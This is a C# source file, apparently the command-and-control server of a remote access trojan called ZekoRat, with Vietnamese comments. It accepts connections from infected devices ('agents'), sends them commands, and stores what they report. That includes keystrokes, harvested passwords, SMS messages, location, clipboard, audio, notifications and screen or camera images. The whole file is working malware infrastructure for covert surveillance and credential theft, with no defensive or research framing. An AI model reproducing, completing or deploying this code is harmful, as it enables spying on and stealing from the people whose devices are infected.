using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Text.Json.Nodes;

namespace ZekoRat.Server;

public sealed class AgentSession
{
    public string Id { get; init; } = "";
    public string Hwid { get; init; } = "";
    public TcpClient Tcp { get; init; } = null!;
    public Stream Stream { get; init; } = null!;
    public string RemoteIp { get; init; } = "";
    public DateTime ConnectedAt { get; } = DateTime.UtcNow;
    public DateTime LastSeen { get; set; } = DateTime.UtcNow;
    public JsonObject Info { get; set; } = new();
    public bool Alive => Tcp.Connected;

    internal readonly SemaphoreSlim WriteLock = new(1, 1);
    internal readonly ConcurrentDictionary<string, TaskCompletionSource<JsonObject>> Pending = new();

    public async Task SendAsync(JsonObject obj, CancellationToken ct = default)
    {
        await WriteLock.WaitAsync(ct);
        try
        {
            if (!Tcp.Connected) throw new IOException("agent offline");
            await Proto.WriteFrameAsync(Stream, obj, Hub.Psk, ct);
        }
        finally { WriteLock.Release(); }
    }

    /// <summary>Gửi lệnh và chờ agent trả lời theo id.</summary>
    public async Task<JsonObject> CallAsync(string cmd, JsonObject? data, TimeSpan timeout, CancellationToken ct = default)
    {
        var id = Guid.NewGuid().ToString("N")[..12];
        var tcs = new TaskCompletionSource<JsonObject>(TaskCreationOptions.RunContinuationsAsynchronously);
        Pending[id] = tcs;

        var frame = new JsonObject
        {
            ["t"] = "cmd",
            ["id"] = id,
            ["cmd"] = cmd,
            // JsonNode không cho 1 node có 2 cha → clone trước khi gắn vào frame
            ["data"] = data is null ? new JsonObject() : JsonNode.Parse(data.ToJsonString())!
        };

        try
        {
            await SendAsync(frame, ct);
            using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            cts.CancelAfter(timeout);
            await using var _ = cts.Token.Register(() => tcs.TrySetCanceled()).ConfigureAwait(false);
            var resp = await tcs.Task.ConfigureAwait(false);
            return resp["data"] as JsonObject ?? new JsonObject();
        }
        finally
        {
            Pending.TryRemove(id, out _);
        }
    }
}

public sealed class Hub
{
    public static byte[]? Psk = null;

    readonly ConcurrentDictionary<string, AgentSession> _byHwid = new();
    readonly TcpListener _listener;

    public Hub(int port)
    {
        _listener = new TcpListener(IPAddress.Any, port);
    }

    public IReadOnlyCollection<AgentSession> Agents => _byHwid.Values.ToList();

    public AgentSession? Get(string hwid) => _byHwid.TryGetValue(hwid, out var s) ? s : null;

    public async Task RunAsync(CancellationToken ct)
    {
        _listener.Start();
        Log.Info($"tcp listener 0.0.0.0:{((IPEndPoint)_listener.LocalEndpoint).Port} (psk={(Psk is null ? "off" : "aes-256-gcm")})");
        while (!ct.IsCancellationRequested)
        {
            TcpClient tcp;
            try { tcp = await _listener.AcceptTcpClientAsync(ct); }
            catch (OperationCanceledException) { break; }
            catch (Exception ex) { Log.Warn("accept: " + ex.Message); continue; }
            _ = Task.Run(() => HandleAsync(tcp, ct), ct);
        }
    }

    async Task HandleAsync(TcpClient tcp, CancellationToken ct)
    {
        tcp.NoDelay = true;
        var stream = tcp.GetStream();
        var ip = (tcp.Client.RemoteEndPoint as IPEndPoint)?.Address.ToString() ?? "?";
        AgentSession? session = null;
        try
        {
            while (!ct.IsCancellationRequested)
            {
                var payload = await Proto.ReadFrameAsync(stream, ct);
                if (payload is null) break;
                var obj = Proto.Decode(payload, Psk);
                if (obj is null) continue;
                var type = obj["t"]?.GetValue<string>();

                if (type == "hello")
                {
                    var hwid = obj["hwid"]?.GetValue<string>() ?? Guid.NewGuid().ToString("N");
                    session = new AgentSession
                    {
                        Id = hwid,
                        Hwid = hwid,
                        Tcp = tcp,
                        Stream = stream,
                        RemoteIp = ip,
                        Info = obj["info"] as JsonObject ?? new JsonObject()
                    };
                    _byHwid[hwid] = session;
                    Store.UpsertAgent(session);
                    Log.Ok($"agent online {hwid[..Math.Min(8, hwid.Length)]} @ {ip} {session.Info["host"]}");
                    // trả lời hello để agent biết đã vào
                    await Proto.WriteFrameAsync(stream, new JsonObject { ["t"] = "hello_ok" }, Psk, ct);
                    continue;
                }

                if (session is null) break;
                session.LastSeen = DateTime.UtcNow;

                switch (type)
                {
                    case "resp":
                        {
                            var id = obj["id"]?.GetValue<string>();
                            if (id is not null && session.Pending.TryGetValue(id, out var tcs))
                                tcs.TrySetResult(obj);
                            break;
                        }
                    case "evt":
                        {
                            var name = obj["cmd"]?.GetValue<string>() ?? "";
                            if (name == "keylog")
                            {
                                var text = obj["data"]?["text"]?.GetValue<string>() ?? "";
                                if (text.Length > 0) Store.AddKeylog(session.Hwid, text);
                            }
                            else if (name == "passwords")
                            {
                                if (obj["data"]?["rows"] is JsonArray rows)
                                    Store.AddPasswords(session.Hwid, rows);
                            }
                            else if (name is "sms" or "location" or "clipboard" or "audio"
                                          or "screen_state" or "notif")
                            {
                                EvtHub.Put(session.Hwid, name, obj["data"]?.DeepClone());
                            }
                            else if (name == "frame")
                            {
                                var kind = obj["data"]?["kind"]?.ToString() ?? "screen";
                                var b64 = obj["data"]?["jpeg"]?.ToString();
                                if (!string.IsNullOrEmpty(b64))
                                {
                                    try { FrameHub.Put(session.Hwid, kind, Convert.FromBase64String(b64)); }
                                    catch { }
                                }
                            }
                            break;
                        }
                    case "ping":
                        await Proto.WriteFrameAsync(stream, new JsonObject { ["t"] = "pong" }, Psk, ct);
                        break;
                }
            }
        }
        catch (Exception ex) { Log.Warn("session: " + ex.Message); }
        finally
        {
            if (session is not null)
            {
                _byHwid.TryRemove(session.Hwid, out _);
                Store.MarkOffline(session.Hwid);
                Log.Warn($"agent offline {session.Hwid[..Math.Min(8, session.Hwid.Length)]}");
            }
            try { tcp.Close(); } catch { }
        }
    }
}

public static class Log
{
    static readonly object L = new();
    public static void Write(string tag, string msg)
    {
        lock (L) Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {tag} {msg}");
    }
    public static void Info(string m) => Write("i", m);
    public static void Ok(string m) => Write("+", m);
    public static void Warn(string m) => Write("!", m);
}
